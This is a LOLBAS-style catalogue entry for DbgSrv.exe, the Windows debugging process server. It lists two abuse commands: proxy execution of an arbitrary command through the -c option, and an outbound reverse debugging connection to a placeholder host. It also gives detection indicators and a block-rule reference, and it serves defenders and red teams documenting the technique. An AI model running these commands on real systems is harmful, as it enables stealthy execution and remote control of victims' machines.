---
Acknowledgement:
- Person: PHYO PAING H
Author: Phyo Paing Htun
Code_Sample:
- Code: https://gist.github.com/analyticsearch/de5c05229d5bf4f8c72016a2a43034eb
- Code: https://github.com/user-attachments/files/30500523/Invoke-DbgSrvLolbas.zip
Commands:
- Category: Execute
  Command: dbgsrv.exe -t tcp:port=5005 -c {CMD}
  Description: Creates a process server and launches the specified command using the
    DbgSrv.exe -c option.
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Proxy execution of a command through a trusted Microsoft-signed debugging
    utility.
- Category: Execute
  Command: dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
  Description: Establishes an outbound reverse connection from the DbgSrv process
    server to a remote debugging client using the clicon option. A connected debugging
    client can subsequently interact with processes through the remote debugging session.
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: Remote
  Usecase: Establish a reverse remote-debugging channel through a trusted Microsoft-signed
    developer utility.
Created: 2026-07-29
Description: A process server included with Debugging Tools for Windows for remote
  user-mode debugging.
Detection:
- IOC: DbgSrv.exe spawning a child process after execution with the -c option.
- IOC: DbgSrv.exe command lines containing -c, -pc, clicon=, or hidden.
- IOC: DbgSrv.exe establishing an unexpected outbound connection to an external host.
- IOC: DbgSrv.exe communicating over ports that are not approved for remote debugging.
- IOC: DbgSrv.exe executed from outside an expected Windows Kits or Debugging Tools
    directory.
- IOC: DbgSrv.exe spawning a command interpreter, script engine, or executable from
    a user-writable directory.
- IOC: A normally network-inactive process, such as notepad.exe, initiating an external
    connection shortly after DbgSrv.exe establishes a connection to the same host
    or infrastructure.
- IOC: DbgSrv.exe launched by explorer.exe on a system where interactive remote debugging
    is not expected.
- BlockRule: https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol
Full_Path:
- Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbgsrv.exe
- Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\dbgsrv.exe
- Path: C:\Program Files\Debugging Tools for Windows (x64)\dbgsrv.exe
- Path: C:\Program Files\Debugging Tools for Windows (x86)\dbgsrv.exe
Name: DbgSrv.exe
Resources:
- Link: https://github.com/user-attachments/assets/ff08bc79-4cca-4bf8-b659-7025a99c443f
- Link: https://github.com/LOLBAS-Project/LOLBAS/pull/516#issuecomment-5116289639
- Link: https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/dbgsrv-command-line-options
- Link: https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/activating-a-process-server
- Link: https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools
- Link: https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol
- Link: https://redcanary.com/blog/threat-detection/black-hat-detecting-the-unknown-and-disclosing-a-new-attack-technique/
- Link: https://gist.github.com/analyticsearch/de5c05229d5bf4f8c72016a2a43034eb
mitre_data:
  technique_ids:
  - T1127
tags:
- lolbas/othermsbinaries
---

# DbgSrv.exe

A process server included with Debugging Tools for Windows for remote user-mode debugging.

# Path(s)

- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbgsrv.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\dbgsrv.exe`
- `C:\Program Files\Debugging Tools for Windows (x64)\dbgsrv.exe`
- `C:\Program Files\Debugging Tools for Windows (x86)\dbgsrv.exe`

# Execute Commands

Creates a process server and launches the specified command using the DbgSrv.exe -c option.

```batch
dbgsrv.exe -t tcp:port=5005 -c {CMD}
```

- **Usecase:** Proxy execution of a command through a trusted Microsoft-signed debugging utility.
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



Establishes an outbound reverse connection from the DbgSrv process server to a remote debugging client using the clicon option. A connected debugging client can subsequently interact with processes through the remote debugging session.

```batch
dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
```

- **Usecase:** Establish a reverse remote-debugging channel through a trusted Microsoft-signed developer utility.
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



# Resource(s)

- https://github.com/user-attachments/assets/ff08bc79-4cca-4bf8-b659-7025a99c443f
- https://github.com/LOLBAS-Project/LOLBAS/pull/516#issuecomment-5116289639
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/dbgsrv-command-line-options
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/activating-a-process-server
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools
- https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol
- https://redcanary.com/blog/threat-detection/black-hat-detecting-the-unknown-and-disclosing-a-new-attack-technique/
- https://gist.github.com/analyticsearch/de5c05229d5bf4f8c72016a2a43034eb
# Acknowledgements

- Phyo Paing Htun (Authored, 2026-07-29)
- PHYO PAING H